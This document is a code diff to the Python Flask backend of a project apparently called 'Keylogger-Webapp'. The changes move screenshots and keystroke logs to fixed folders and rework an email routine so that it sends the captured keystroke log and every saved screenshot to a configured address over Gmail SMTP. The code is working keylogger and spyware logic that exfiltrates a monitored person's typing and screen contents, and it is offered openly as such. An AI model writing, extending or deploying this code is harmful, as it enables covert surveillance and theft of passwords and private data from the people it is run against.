@@ -10,12 +10,10 @@ from flask_cors import CORS
 from email.message import EmailMessage
 import mimetypes
 
-
-# Load environment variables
 load_dotenv()
 
 app = Flask(__name__)
-CORS(app)  # Enable CORS for frontend communication
+CORS(app)
 
 # Database connection
 def get_db_connection():
@@ -29,7 +27,7 @@ def get_db_connection():
 
 # Email Configuration
 SMTP_SERVER = "smtp.gmail.com"
-SMTP_PORT = 587
+SMTP_PORT = 465
 EMAIL_SENDER = os.getenv("SENDER_EMAIL")
 EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
 EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")
@@ -75,9 +73,13 @@ def log_keystroke():
 
 ### **📸 Screenshot Capture Function**
 def capture_screenshot():
-    screenshot_path = f"screenshot_{int(time.time())}.png"
+    screenshot_path = f"E:\\Keylogger-Webapp\\backend\\logs\\screenshots\\screenshot_{int(time.time())}.png"
     pyautogui.screenshot().save(screenshot_path)
     return screenshot_path
+
+
+LOG_FILE = "E:\\Keylogger-Webapp\\backend\\logs\\keylogs.txt"
+SCREENSHOT_FOLDER = "E:\\Keylogger-Webapp\\backend\\logs\\screenshots"
 
 
 def send_email_report():
@@ -88,24 +90,28 @@ def send_email_report():
         msg["To"] = EMAIL_RECEIVER
         msg.set_content("Attached are the latest keystroke logs and screenshots.")
 
-        # Attach Keystroke Log (text file)
-        log_filename = "keystrokes.txt"
-        if os.path.exists(log_filename):
-            with open(log_filename, "rb") as f:
-                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename=log_filename)
+        # Attach keylogs
+        if os.path.exists(LOG_FILE):
+            with open(LOG_FILE, "rb") as f:
+                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keystrokes.txt")
+ 
+        if os.path.exists(SCREENSHOT_FOLDER):
+            screenshot_files = sorted(os.listdir(SCREENSHOT_FOLDER))
+            for filename in screenshot_files:
+                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
+                if os.path.isfile(filepath) and filename.endswith(".png"):
+                    ctype, encoding = mimetypes.guess_type(filepath)
+                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")
 
-        # Attach Latest Screenshot (image file)
-        screenshot_filename = "latest_screenshot.png"
-        if os.path.exists(screenshot_filename):
-            with open(screenshot_filename, "rb") as f:
-                msg.add_attachment(f.read(), maintype="image", subtype="png", filename=screenshot_filename)
+                    with open(filepath, "rb") as f:
+                        msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=filename)
 
-        # Send the email
-        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+        # Send Email
+        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
             server.login(EMAIL_SENDER, EMAIL_PASSWORD)
             server.send_message(msg)
 
-        print("✅ Email Sent Successfully!")
+        print("✅ Email Sent Successfully with Multiple Screenshots!")
 
     except Exception as e:
         print(f"❌ Email Error: {e}")
